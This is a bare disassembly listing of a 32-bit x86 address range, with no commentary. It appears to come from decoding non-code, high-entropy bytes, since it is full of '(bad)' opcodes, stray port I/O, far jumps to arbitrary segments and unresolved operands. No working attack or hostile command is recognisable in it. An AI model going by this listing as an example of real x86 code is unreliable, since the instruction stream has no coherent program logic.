  4250e9:	in     al,dx
  4250ea:	and    dh,BYTE PTR [edx]
  4250ec:	push   eax
  4250ed:	mov    al,0x22
  4250ef:	jecxz  0x425166
  4250f1:	jnp    0x425082
  4250f3:	mov    DWORD PTR [ebx+esi*4-0x1436bcc0],edi
  4250fa:	pop    esp
  4250fb:	cmp    ebx,DWORD PTR [ebp+0x6186f01b]
  425101:	push   esp
  425102:	push   esp
  425103:	mov    ebp,0x9612c300
  425108:	mov    al,0x3e
  42510a:	cmp    BYTE PTR ds:0x5f36357c,ch
  425110:	lea    eax,[eax]
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x44b8:0xfa6b92e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x30000001,al
  42518d:	push   esp
  42518e:	sar    DWORD PTR [ecx-0x64],0xab
  425192:	pop    ds
  425193:	fwait
  425194:	aas    
  425195:	adc    ecx,ecx
  425197:	popf   
  425198:	cmp    al,0x21
  42519a:	not    BYTE PTR [edi+0x635b9125]
  4251a0:	std    
  4251a1:	and    BYTE PTR [edx+0x27b65a70],bl
  4251a7:	ret    
  4251a8:	push   esi
  4251a9:	or     al,dh
  4251ab:	add    eax,0x65d649d1
  4251b0:	add    esp,DWORD PTR [si]
  4251b3:	mov    WORD PTR [esp-0x59b16760],ss
  4251ba:	pop    edx
  4251bb:	imul   eax,DWORD PTR [esi],0xffffffa6
  4251be:	cmp    DWORD PTR ss:[ebp+eiz*4+0x6a],edi
  4251c3:	ds xchg edx,eax
  4251c5:	ins    BYTE PTR es:[edi],dx
  4251c6:	or     sp,WORD PTR [edx+0x7b]
  4251ca:	mov    esp,0x4093c8a2
  4251cf:	push   ss
  4251d0:	mov    eax,ds:0xc067d9c1
  4251d5:	push   cs
  4251d6:	xchg   edi,eax
  4251d7:	and    dh,al
  4251d9:	xchg   ebx,eax
  4251da:	push   es
  4251db:	les    ecx,FWORD PTR [eax+ecx*1+0x310aa9c2]
  4251e2:	or     BYTE PTR [eax+0x3a],0xd1
  4251e6:	add    eax,edi
  4251e8:	mov    esi,0xa07d5afd
  4251ed:	push   es
  4251ee:	je     0x42525e
  4251f0:	xor    BYTE PTR [edi],cl
  4251f2:	and    ebx,DWORD PTR [ecx-0x74]
  4251f5:	sar    DWORD PTR [ecx],0x3b
  4251f8:	ss daa 
  4251fa:	(bad)  
  4251fb:	aas    
  4251fc:	dec    edi
  4251fd:	or     eax,0x7bff5535
  425202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425203:	dec    esp
  425204:	into   
  425205:	aam    0x75
  425207:	inc    ecx
  425208:	fbstp  TBYTE PTR [eax-0x3d]
  42520b:	cmp    al,0x55
  42520d:	pusha  
  42520e:	shl    esi,1
  425210:	and    ah,al
  425212:	adc    DWORD PTR [eax-0x1f],0xffffffda
  425216:	xor    DWORD PTR [esi],ebp
  425218:	sbb    esp,DWORD PTR [ecx]
  42521a:	sbb    BYTE PTR [edi],ch
  42521c:	xchg   ecx,eax
  42521d:	add    eax,0xea7c98f1
  425222:	or     ebx,ebp
  425224:	xchg   esp,eax
  425225:	pop    edi
  425226:	xor    eax,0x9af524f7
  42522b:	in     al,0x5a
  42522d:	sbb    eax,0x28ecedc7
  425232:	xchg   edi,eax
  425233:	in     eax,dx
  425234:	mov    cl,0x46
  425236:	repz xchg edi,eax
  425238:	shl    BYTE PTR [ebx-0x1f],cl
  42523b:	xor    ah,bl
  42523d:	push   0x3
  42523f:	mov    ds:0xde1e49e3,al
  425244:	mov    edi,DWORD PTR [esi]
  425246:	mov    eax,0x5af33943
  42524b:	xchg   esp,eax
  42524c:	cmp    al,0xdb
  42524e:	repnz retf 
  425250:	fwait
  425251:	clc    
  425252:	and    esp,DWORD PTR fs:[esp+eiz*8+0x4b]
  425257:	and    al,0xc7
  425259:	cld    
  42525a:	xchg   edx,eax
  42525b:	loopne 0x425232
  42525d:	add    eax,0x395690d6
  425262:	mov    ebp,0x68d4b68a
  425267:	mov    bl,0x4e
  425269:	pop    eax
  42526a:	xchg   esp,eax
  42526b:	pop    edx
  42526c:	push   esp
  42526d:	cwde   
  42526e:	bound  edi,QWORD PTR [eax-0x16b84b6c]
  425274:	(bad)  
  425275:	out    dx,al
  425276:	(bad)  
  425277:	sub    ebx,DWORD PTR [edx-0x1c8ebc00]
  42527d:	lahf   
  42527e:	test   eax,0xaf877384
  425283:	or     eax,0x67bbff0f
  425288:	sub    bh,ah
  42528a:	inc    eax
  42528b:	xchg   esi,eax
  42528c:	and    al,ch
  42528e:	cmp    DWORD PTR [edx-0x2b],esi
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	jp     0x425342
  425302:	fst    QWORD PTR [esp+esi*2]
  425305:	lea    eax,[ecx]
  425307:	add    BYTE PTR ds:0xc2000001,al
  42530d:	scas   eax,DWORD PTR es:[edi]
  42530e:	sub    esp,DWORD PTR [ebp*1+0x190a7e29]
  425315:	push   ebp
  425316:	arpl   cx,ax
  425318:	jmp    0x4c54db8d
  42531d:	cmp    eax,0x5c2167a
  425322:	jno    0x4252f2
  425324:	jge    0x42534a
  425326:	stc    
  425327:	mov    ds:0x571470d8,al
  42532c:	ss cmp ebp,esp
  42532f:	jne    0x42536c
  425331:	out    0x57,al
  425333:	(bad)  
  425334:	leave  
  425335:	mov    al,0xf6
  425337:	pop    edx
  425338:	and    bl,BYTE PTR [ecx-0x28bda92d]
  42533e:	sub    eax,0x483636b9
  425343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425344:	push   0x417e7643
  425349:	or     dh,BYTE PTR [ebx-0x4e203296]
  42534f:	and    DWORD PTR [eax],esp
  425351:	inc    esi
  425352:	rol    BYTE PTR [ecx],0x75
  425355:	test   al,0x2b
  425357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425358:	mov    cs,eax
  42535a:	mov    dl,0x3
  42535c:	retf   0x7658
  42535f:	push   0xffffffb1
  425361:	sbb    dh,BYTE PTR es:[ebx+0x5dcec352]
  425368:	scas   al,BYTE PTR es:[edi]
  425369:	int3   
  42536a:	imul   ebx,DWORD PTR [eax+edx*2-0x5cc64424],0x7c
  425372:	jb     0x4253cd
  425374:	out    dx,al
  425375:	jmp    0x425398
  425377:	pushf  
  425378:	xorps  xmm2,xmm5
  42537b:	mov    ds,WORD PTR [ebp-0x3d]
  42537e:	pusha  
  42537f:	outs   dx,DWORD PTR ds:[esi]
  425380:	icebp  
  425381:	std    
  425382:	and    BYTE PTR [ecx-0x35],bh
  425385:	xlat   BYTE PTR ds:[ebx]
  425386:	iret   
  425387:	dec    ebp
  425388:	pop    esi
  425389:	jg     0x42531a
  42538b:	sbb    ebp,DWORD PTR [eax]
  42538d:	not    DWORD PTR [ebx]
  42538f:	clc    
  425390:	aam    0x4e
  425392:	jp     0x4253aa
  425394:	lock fstp TBYTE PTR [esi]
  425397:	add    BYTE PTR [eax+0x11536e12],bl
  42539d:	adc    edi,eax
  42539f:	add    BYTE PTR [ecx+0x154f8057],0x5e
  4253a6:	adc    al,0x6b
  4253a8:	scas   al,BYTE PTR es:[edi]
  4253a9:	cli    
  4253aa:	popf   
  4253ab:	inc    edi
  4253ac:	repz pop edi
  4253ae:	hlt    
  4253af:	push   0x78c4fc92
  4253b4:	das    
  4253b5:	pushf  
  4253b6:	bound  esp,QWORD PTR [eax]
  4253b8:	mov    cs,esi
  4253ba:	aad    0xa0
  4253bc:	pop    ss
  4253bd:	sub    BYTE PTR [ecx+eiz*8],al
  4253c0:	mov    eax,ds:0x7881a52d
  4253c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253c6:	ret    
  4253c7:	fidiv  DWORD PTR [eax-0x35]
  4253ca:	popa   
  4253cb:	(bad)  
  4253cc:	ins    BYTE PTR es:[edi],dx
  4253cd:	dec    edx
  4253ce:	and    esi,DWORD PTR [ecx+0x3f]
  4253d1:	add    dl,ch
  4253d3:	shr    DWORD PTR [ebx+0x45cfdc30],1
  4253d9:	and    esi,DWORD PTR [esp+ebp*1-0x36]
  4253dd:	and    DWORD PTR [edx+0x1f72a25b],ebx
  4253e3:	(bad)  
  4253e4:	loop   0x4253b0
  4253e6:	dec    ebx
  4253e7:	into   
  4253e8:	or     al,0xf7
  4253ea:	outs   dx,DWORD PTR ds:[esi]
  4253eb:	int3   
  4253ec:	inc    edx
  4253ed:	push   DWORD PTR [ebp-0x3]
  4253f0:	mov    ecx,0x9a530522
  4253f5:	inc    ecx
  4253f6:	jb     0x4253f6
  4253f8:	dec    esp
  4253f9:	push   ds
  4253fa:	sbb    ecx,DWORD PTR [ecx-0x6e]
  4253fd:	dec    esp
  4253fe:	call   0x15171f68
  425403:	arpl   WORD PTR [edx+0x1a],si
  425406:	outs   dx,DWORD PTR ds:[esi]
  425407:	adc    esp,DWORD PTR [ecx+0x4a40df51]
  42540d:	inc    eax
  42540e:	cwde   
  42540f:	xchg   ebx,eax
  425410:	dec    eax
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    edi,DWORD PTR [eax]
  425481:	retf   0xe7fd
  425484:	jns    0x425414
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0x74000001
  42548d:	sub    al,0x7a
  42548f:	ins    DWORD PTR es:[edi],dx
  425490:	push   0x64
  425492:	rcr    BYTE PTR [eax+edx*4+0x28f83ca5],1
  425499:	mov    dl,0xf8
  42549b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42549c:	aam    0xf5
  42549e:	xchg   ecx,eax
  42549f:	call   0x891a:0xf2c4fcc3
  4254a6:	lods   eax,DWORD PTR ds:[esi]
  4254a7:	call   0xbf6b9e30
  4254ac:	push   0x5847b7e5
  4254b1:	push   edi
  4254b2:	push   ebp
  4254b3:	lea    edx,[edx]
  4254b5:	mov    ecx,0x8fbca75a
  4254ba:	push   0x8e2ed2d5
  4254bf:	adc    esi,esi
  4254c1:	fnsetpm(287 only) 
  4254c3:	je     0x42549f
  4254c5:	sbb    DWORD PTR [edi+edi*8-0x41cc3978],ecx
  4254cc:	inc    edi
  4254cd:	push   ecx
  4254ce:	out    0xe5,eax
  4254d0:	cdq    
  4254d1:	mov    ebp,0x9614160a
  4254d6:	xor    ecx,esi
  4254d8:	xor    DWORD PTR [ecx-0x2],ebx
  4254db:	sub    bh,dh
  4254dd:	adc    al,0xcf
  4254df:	sub    BYTE PTR [ebp-0x5b],al
  4254e2:	cmp    BYTE PTR [esi+0x45b227e],ah
  4254e8:	cmp    eax,0x2a1b8ee5
  4254ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254ee:	daa    
  4254ef:	or     ebp,DWORD PTR [ecx]
  4254f1:	jecxz  0x4254ed
  4254f3:	addr16 jno 0x425486
  4254f6:	test   DWORD PTR [ecx+ebp*1-0x4dae8617],esi
  4254fd:	push   0x514b2be3
  425502:	out    0xfd,eax
  425504:	div    BYTE PTR [esi]
  425506:	sub    eax,0x69e22132
  42550b:	pop    es
  42550c:	lods   al,BYTE PTR ds:[esi]
  42550d:	adc    DWORD PTR [eax+0x75],ebp
  425510:	mov    ebx,0xbdc9df4
  425515:	rcr    ch,1
  425517:	retf   
  425518:	test   DWORD PTR [ecx],ecx
  42551a:	sub    ch,dh
  42551c:	mov    ah,0x1
  42551e:	cwde   
  42551f:	outs   dx,BYTE PTR ds:[esi]
  425520:	imul   esp,DWORD PTR [ebx],0x16
  425523:	out    dx,eax
  425524:	imul   esp,DWORD PTR [ecx+eax*2-0x75],0x70
  425529:	daa    
  42552a:	rol    BYTE PTR [ecx+0x6c],0xa7
  42552e:	xor    al,0x12
  425530:	push   ebx
  425531:	shl    eax,cl
  425533:	out    0x1a,eax
  425535:	mov    BYTE PTR [esp+edi*8-0x2d8db26f],cl
  42553c:	push   ebx
  42553d:	mov    bl,BYTE PTR [edx]
  42553f:	pop    edx
  425540:	sbb    eax,0x7c8f8965
  425545:	pop    ss
  425546:	stos   BYTE PTR es:[edi],al
  425547:	mov    eax,0x3e3bab3
  42554c:	call   0x3641:0x10f2c9bf
  425553:	jbe    0x42558b
  425555:	pop    DWORD PTR [edx+ebx*2]
  425558:	imul   ecx,ebp,0x59c91e5a
  42555e:	dec    ebx
  42555f:	pushf  
  425560:	add    bh,BYTE PTR [edx+0xeba3811]
  425566:	and    edi,DWORD PTR [esi]
  425568:	pop    ds
  425569:	shl    DWORD PTR [ebx+eax*2+0x26936f8b],0x40
  425571:	jge    0x42558e
  425573:	adc    cx,WORD PTR [esi+0x55ffc3aa]
  42557a:	shl    ebx,0x76
  42557d:	jmp    0xdc055e2f
  425582:	and    BYTE PTR [eax+0x1aa4b63f],bh
  425588:	stos   DWORD PTR es:[edi],eax
  425589:	inc    ecx
  42558a:	out    dx,eax
  42558b:	dec    eax
  42558c:	mov    bl,0xb
  42558e:	push   edx
  42558f:	push   eax
  425590:	sub    al,0x0
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x60bcf13a
  425602:	mov    bl,0x92
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x1
  42560d:	mov    edi,0x8616dd97
  425612:	push   cs
  425613:	push   0x47
  425615:	bound  eax,QWORD PTR [eax+0x2433f4d4]
  42561b:	adc    al,0x87
  42561d:	outs   dx,DWORD PTR ds:[esi]
  42561e:	mov    ds:0x7cedd7ed,eax
  425623:	fadd   QWORD PTR ds:0x327bf4d3
  425629:	std    
  42562a:	cmp    DWORD PTR [ecx],edi
  42562c:	cdq    
  42562d:	pop    ebx
  42562e:	std    
  42562f:	sbb    al,0x77
  425631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425632:	xchg   esp,eax
  425633:	adc    BYTE PTR ds:0x5aa63df5,bh
  425639:	mov    ebp,0xf201ca21
  42563e:	mov    edx,0xf6453e6c
  425643:	mov    es,WORD PTR [ecx]
  425645:	stos   BYTE PTR es:[edi],al
  425646:	loop   0x4256b5
  425648:	push   eax
  425649:	pop    edi
  42564a:	cmp    ebp,ecx
  42564c:	adc    eax,0x1261c67a
  425651:	rcl    DWORD PTR [eax+0x7a],cl
  425654:	or     BYTE PTR [esi],al
  425656:	and    sp,WORD PTR [ecx-0x42]
  42565a:	mov    dh,ah
  42565c:	out    0xc5,eax
  42565e:	sbb    DWORD PTR [ebx+0x39],eax
  425661:	or     cl,dh
  425663:	push   esp
  425664:	loop   0x42562e
  425666:	cmp    al,0xc4
  425668:	mov    edx,0xb396be3e
  42566d:	jnp    0x4255fc
  42566f:	(bad)  
  425670:	fld    TBYTE PTR [edx]
  425672:	xor    DWORD PTR [eax+0x10d55c94],ecx
  425678:	jo     0x425626
  42567a:	test   eax,0x64a6391f
  42567f:	ins    DWORD PTR es:[edi],dx
  425680:	xor    eax,0xd9894254
  425685:	cmp    ah,al
  425687:	imul   ecx,DWORD PTR [edi],0x22
  42568a:	sbb    al,BYTE PTR [ecx-0x4]
  42568d:	ficom  WORD PTR [ebx+0x51]
  425690:	and    DWORD PTR [edx+eax*2],ebp
  425693:	adc    ecx,ebx
  425695:	and    ecx,DWORD PTR [ebp+0x1b294fff]
  42569b:	push   0x7c
  42569d:	push   ebx
  42569e:	fldenv [eax-0x7a0401e8]
  4256a4:	mov    bh,0xd9
  4256a6:	loope  0x4256d1
  4256a8:	data16 daa 
  4256aa:	dec    ebp
  4256ab:	xchg   ebp,eax
  4256ac:	dec    ebx
  4256ad:	dec    eax
  4256ae:	mov    esp,DWORD PTR [edi+0x5c332eed]
  4256b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256b5:	xchg   BYTE PTR [ecx+0xd],bh
  4256b8:	ins    DWORD PTR es:[edi],dx
  4256b9:	in     al,dx
  4256ba:	fcom   DWORD PTR [edx+ebp*4-0x3a]
  4256be:	mov    ds:0x24e05ed3,al
  4256c3:	int3   
  4256c4:	adc    dh,bl
  4256c6:	imul   edx,DWORD PTR [edi-0x77],0x50
  4256ca:	mov    dh,0xa8
  4256cc:	push   0xfffffff5
  4256ce:	and    BYTE PTR [ebp+0x77904687],dl
  4256d4:	xchg   ebx,eax
  4256d5:	imul   ebx,edi,0xffffffce
  4256d8:	xchg   edx,eax
  4256d9:	imul   esi,DWORD PTR [ebx+ecx*4-0x23e3b606],0x70
  4256e1:	jp     0x425683
  4256e3:	popf   
  4256e4:	push   esi
  4256e5:	call   0x1bf6:0xd27e1587
  4256ec:	sahf   
  4256ed:	sub    esi,esp
  4256ef:	jg     0x42567c
  4256f1:	ins    DWORD PTR es:[edi],dx
  4256f2:	xor    BYTE PTR [edi+eiz*8],0xc2
  4256f6:	and    eax,0xecfdca14
  4256fb:	loop   0x425774
  4256fd:	enter  0x8e74,0x14
  425701:	cwde   
  425702:	mov    WORD PTR cs:[esp+edi*8],?
  425706:	mov    eax,ds:0xbad11684
  42570b:	sub    cl,BYTE PTR [ebp+0x2a5c9603]
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xbc694c74
  425783:	cmp    DWORD PTR [ebx+0x5000190],eax
  425789:	add    DWORD PTR [eax],eax
  42578b:	add    BYTE PTR [esi-0x7],bh
  42578e:	inc    ecx
  42578f:	icebp  
  425790:	fwait
  425791:	jnp    0x4257ac
  425793:	mov    ds:0x59d4aa23,eax
  425798:	pop    ebx
  425799:	and    eax,esp
  42579b:	verw   WORD PTR [edi]
  42579e:	arpl   WORD PTR [ebp-0x2440c9a0],cx
  4257a4:	dec    esi
  4257a5:	add    al,0xa2
  4257a7:	test   eax,0x87f4771a
  4257ac:	inc    edx
  4257ad:	cli    
  4257ae:	mov    edi,ebx
  4257b0:	sub    eax,0x54f5811c
  4257b5:	jl     0x425778
  4257b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257b8:	mov    ebp,0xedc86c6
  4257bd:	mov    ah,0x4e
  4257bf:	dec    ebp
  4257c0:	in     eax,dx
  4257c1:	add    al,0x6a
  4257c3:	ins    BYTE PTR es:[edi],dx
  4257c4:	repz (bad) 
  4257c6:	adc    edi,DWORD PTR [edi]
  4257c8:	push   esp
  4257c9:	fisttp QWORD PTR [edi-0x5c]
  4257cc:	and    ebp,DWORD PTR [ebx]
  4257ce:	and    eax,0x5dc2b26b
  4257d3:	dec    esi
  4257d4:	pushf  
  4257d5:	pop    esp
  4257d6:	test   eax,0xe18a46c0
  4257db:	stos   BYTE PTR es:[edi],al
  4257dc:	fisubr WORD PTR [edx+0x185e98dd]
  4257e2:	int3   
  4257e3:	mov    dl,0x1e
  4257e5:	push   eax
  4257e6:	xchg   ebp,eax
  4257e7:	xor    esp,DWORD PTR [eax]
  4257e9:	adc    dh,BYTE PTR [edx+ecx*4+0x5adbfad6]
  4257f0:	fistp  DWORD PTR [ebp+0x3]
  4257f3:	mov    dl,0x44
  4257f5:	call   0x8586:0xc99ff0c2
  4257fc:	dec    edx
  4257fd:	sub    al,0x7d
  4257ff:	sub    al,0x25
  425801:	cmp    DWORD PTR ds:0x99336e6,edi
  425807:	jno    0x4257f5
  425809:	xor    DWORD PTR [ecx+0x74],ebp
  42580c:	pop    edx
  42580d:	ret    
  42580e:	pop    edi
  42580f:	aaa    
  425810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425811:	adc    eax,DWORD PTR [edx]
  425813:	stos   BYTE PTR es:[edi],al
  425814:	push   es
  425815:	add    DWORD PTR [esi],edi
  425817:	or     DWORD PTR [esi-0x71],edx
  42581a:	and    eax,0x4a2afeaa
  42581f:	mov    ecx,0xfc0f7b56
  425824:	(bad)  
  425825:	stc    
  425826:	test   DWORD PTR [edx+0x78],eax
  425829:	add    DWORD PTR [esi+0x2e55198c],0xffffffa8
  425830:	or     al,0x6f
  425832:	add    cl,dh
  425834:	jge    0x425889
  425836:	mov    ebx,0x1d985d1c
  42583b:	mov    bh,0x5e
  42583d:	adc    eax,0xa4418359
  425842:	add    DWORD PTR [ecx-0x4409eaa4],ebx
  425848:	mov    DWORD PTR [esi-0x509ce2f3],ebp
  42584e:	push   esp
  42584f:	jns    0x425812
  425851:	xor    cl,BYTE PTR [edi+0x14]
  425854:	and    eax,0xed952bf9
  425859:	xor    DWORD PTR [eax+0x6d],esp
  42585c:	cmp    DWORD PTR [esi],0x3f
  42585f:	std    
  425860:	adc    bl,BYTE PTR ds:[esi+0x30]
  425864:	out    dx,eax
  425865:	in     al,0x7
  425867:	cmp    eax,ecx
  425869:	inc    edx
  42586a:	data16 fxtract 
  42586d:	pushf  
  42586e:	mov    al,ds:0x5286c069
  425873:	imul   esi,DWORD PTR [edi],0x50
  425876:	(bad)  
  425878:	mov    dh,0xe
  42587a:	push   esp
  42587b:	jmp    DWORD PTR [edx+0x7165ce4]
  425881:	xchg   ecx,eax
  425882:	adc    bh,ah
  425884:	mul    BYTE PTR [ebx-0x7e4e08af]
  42588a:	(bad)  
  42588b:	mov    eax,0xd2a5f131
  425890:	pop    ebx
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	ficom  WORD PTR [ebx]
  425902:	inc    ebp
  425903:	loop   0x42588d
  425905:	xchg   ecx,eax
  425906:	add    DWORD PTR [eax],eax
  425908:	add    eax,0x16000001
  42590d:	sub    eax,0x7453bdb
  425912:	scas   eax,DWORD PTR es:[edi]
  425913:	sub    DWORD PTR [edx+ebx*4+0xa],0xfffffffa
  425918:	jmp    0xab4f:0xcf1963d4
  42591f:	xlat   BYTE PTR ds:[ebx]
  425920:	jge    0x425932
  425922:	adc    ah,BYTE PTR ds:0xe6b6d44c
  425928:	es dec edx
  42592a:	cmp    DWORD PTR [edx+0x66],edx
  42592d:	jle    0x425931
  42592f:	add    dl,BYTE PTR [eax+0x734856ee]
  425935:	(bad)  
  425936:	mov    gs,WORD PTR [esi+0x2b0ea094]
  42593c:	cmp    ah,BYTE PTR [ebp+0x385b7ad5]
  425942:	sbb    DWORD PTR [edx+0x46],edx
  425945:	add    al,0x9f
  425947:	sahf   
  425948:	sub    bl,BYTE PTR [edi-0x6]
  42594b:	cld    
  42594c:	pushf  
  42594d:	xor    bl,bh
  42594f:	xchg   ebp,eax
  425950:	in     al,0x57
  425952:	icebp  
  425953:	aam    0x73
  425955:	not    BYTE PTR [ecx+ecx*1+0x1f]
  425959:	pop    ebx
  42595a:	and    eax,0xbac843f5
  42595f:	mov    dl,0xab
  425961:	cmp    edx,eax
  425963:	(bad)  
  425965:	lahf   
  425966:	daa    
  425967:	into   
  425968:	jb     0x425943
  42596a:	das    
  42596b:	adc    al,0x58
  42596d:	add    bh,BYTE PTR [ebp+0x30]
  425970:	cld    
  425971:	pop    edi
  425972:	push   0xffffffbc
  425974:	clc    
  425975:	je     0x42595f
  425977:	mov    esi,0x872ef749
  42597c:	and    ebp,DWORD PTR [eax+0x61]
  42597f:	fld    QWORD PTR [ebx]
  425981:	into   
  425982:	mov    bh,BYTE PTR [ecx-0x58daf30c]
  425988:	pop    ecx
  425989:	cmp    DWORD PTR [ebp+eax*1+0x64],ebx
  42598d:	test   BYTE PTR [ebp-0x20],0xf2
  425991:	inc    esp
  425992:	retfw  0xb167
  425996:	aad    0xe9
  425998:	sbb    eax,0x5ec3b7cf
  42599d:	lods   eax,DWORD PTR ds:[esi]
  42599e:	dec    ebx
  42599f:	aam    0xea
  4259a1:	cld    
  4259a2:	jmp    0x6f04d570
  4259a7:	setno  BYTE PTR [ebx]
  4259aa:	fmul   DWORD PTR [ebx+0x3]
  4259ad:	sti    
  4259ae:	int3   
  4259af:	mov    edi,ebx
  4259b1:	retf   
  4259b2:	pop    ebx
  4259b3:	jp     0x4259d9
  4259b5:	repz retf 0xbf5e
  4259b9:	and    al,0xef
  4259bb:	ins    DWORD PTR es:[edi],dx
  4259bc:	out    dx,eax
  4259bd:	mov    edx,0xbfa325d2
  4259c2:	sbb    DWORD PTR [edx],edi
  4259c4:	push   esi
  4259c5:	dec    ebx
  4259c6:	in     eax,0x48
  4259c8:	pushf  
  4259c9:	dec    edi
  4259ca:	fmul   QWORD PTR [esi-0x597a725a]
  4259d0:	popa   
  4259d1:	lods   al,BYTE PTR ds:[esi]
  4259d2:	outs   dx,DWORD PTR ds:[esi]
  4259d3:	adc    DWORD PTR [bx+si],esi
  4259d6:	enter  0x30a,0x7e
  4259da:	gs mov ebx,?
  4259dd:	mov    esp,0x4cfe6f69
  4259e2:	and    eax,0x4b125ee5
  4259e7:	pop    edx
  4259e8:	jg     0x425989
  4259ea:	xor    BYTE PTR [edx-0x2d],dh
  4259ed:	cwde   
  4259ee:	xchg   ebx,eax
  4259ef:	xor    eax,0xfb787bd
  4259f4:	mov    WORD PTR [ebx-0x2a9ee79c],ss
  4259fa:	mov    ?,WORD PTR [ebx+0x3b]
  4259fd:	popa   
  4259fe:	push   ds
  4259ff:	pop    ds
  425a00:	arpl   WORD PTR [edi-0x49],cx
  425a03:	xor    dh,bh
  425a05:	ss add cl,BYTE PTR ds:0xc5608800
  425a0d:	(bad)  
  425a0f:	(bad)  
  425a10:	test   BYTE PTR [eax],0x0
	...
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x5ba3cfd7]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	xor    DWORD PTR [ebx+0x45850532],eax
  425a92:	xchg   ebp,eax
  425a93:	xchg   ebx,eax
  425a94:	(bad)  
  425a95:	jae    0x425a78
  425a97:	dec    esp
  425a98:	aaa    
  425a99:	adc    dh,ah
  425a9b:	rol    BYTE PTR ds:0x294f3b66,0x34
  425aa2:	adc    BYTE PTR [edx-0x2594a5b],dh
  425aa8:	and    DWORD PTR [edx+ecx*2+0x2e939e69],esi
  425aaf:	dec    ebx
  425ab0:	das    
  425ab1:	xlat   BYTE PTR ds:[ebx]
  425ab2:	xchg   BYTE PTR [eax],al
  425ab4:	jno    0x425a55
  425ab6:	add    al,0x16
  425ab8:	rcr    DWORD PTR ds:0x6f00a118,0xc0
  425abf:	rcl    DWORD PTR [edx],cl
  425ac1:	mov    edx,0x13f3f58e
  425ac6:	mov    dl,ah
  425ac8:	lds    ebx,FWORD PTR [edi-0x15ffd7d0]
  425ace:	mov    edi,0x3d7d2c52
  425ad3:	mov    bl,0xb2
  425ad5:	aad    0xd9
  425ad7:	repz pop ss
  425ad9:	addr16 shl cl,cl
  425adc:	test   al,0x25
  425ade:	add    BYTE PTR [ebx],cl
  425ae0:	inc    edx
  425ae1:	pop    esi
  425ae2:	ficomp DWORD PTR [ebp-0x26]
  425ae5:	jno    0x425b57
  425ae7:	gs cdq 
  425ae9:	dec    esi
  425aea:	ret    
  425aeb:	aas    
  425aec:	xchg   ebp,eax
  425aed:	rcl    BYTE PTR [ebp-0x1da376ea],0xb5
  425af4:	sti    
  425af5:	sbb    bh,BYTE PTR ds:0x424a865b
  425afb:	nop
  425afc:	inc    edi
  425afd:	out    0xef,eax
  425aff:	mov    ebp,0x386b5de5
  425b04:	inc    ebx
  425b05:	mov    al,ds:0xb3fb47fa
  425b0a:	cs retf 0x47cf
  425b0e:	mov    eax,ds:0x1feca5c2
  425b13:	mov    dl,0x23
  425b15:	pop    ebp
  425b16:	fs dec edi
  425b18:	test   BYTE PTR [eax],cl
  425b1a:	cmp    DWORD PTR gs:[ebx+0x2e],ecx
  425b1e:	xchg   edi,eax
  425b1f:	sbb    eax,0x8038dc70
  425b24:	das    
  425b25:	pop    ecx
  425b26:	cmp    BYTE PTR [esp+ebp*1],bl
  425b29:	cmp    cl,BYTE PTR [ecx*2+0x332b7b24]
  425b30:	iret   
  425b31:	xchg   edx,eax
  425b32:	clc    
  425b33:	add    BYTE PTR [ecx-0x2d],ah
  425b36:	sahf   
  425b37:	sub    DWORD PTR [ebx],edi
  425b39:	inc    esi
  425b3a:	rol    BYTE PTR [edi+0x5c05d0ea],0xc8
  425b41:	sbb    ebx,DWORD PTR [edi+0x8]
  425b44:	fld    DWORD PTR [edi+edx*8-0x61af52d9]
  425b4b:	xchg   ebx,eax
  425b4c:	loop   0x425bb6
  425b4e:	xchg   DWORD PTR [esi-0x156d32a3],ebx
  425b54:	jmp    0x3a486420
  425b59:	jle    0x425b85
  425b5b:	or     al,0x8f
  425b5d:	dec    esp
  425b5e:	add    esp,DWORD PTR [eax+0x23]
  425b61:	test   DWORD PTR [eax+0x69],0x9b005255
  425b68:	ss addr16 or eax,0xb15c9b23
  425b6f:	jnp    0x425ba3
  425b71:	pop    ecx
  425b72:	inc    eax
  425b73:	repz adc ch,ch
  425b76:	dec    eax
